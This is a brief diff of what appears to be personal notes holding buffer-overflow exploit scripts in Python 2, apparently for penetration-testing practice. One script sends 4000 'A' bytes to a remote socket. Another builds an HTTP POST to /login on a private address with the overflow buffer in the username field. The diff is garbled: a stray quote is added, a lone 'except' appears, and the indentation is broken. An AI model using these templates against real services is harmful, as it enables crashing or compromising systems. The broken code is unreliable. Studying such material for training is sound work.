@@ -56,13 +56,12 @@ buf = "A" * 4000
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((RHOST, RPORT))
 print "Sending buf"
-s.send(buf + '\n')
+s.send(buf + '\n')"
 
 BUFFER OVERFLOW OVER HTTP SCRIPT
 except 
 
 		content = "username=" + inputBuffer + "&password=A"
-
 		buffer = "POST /login HTTP/1.1\r\n"
 		buffer += "Host: 192.168.139.10\r\n"
 		buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
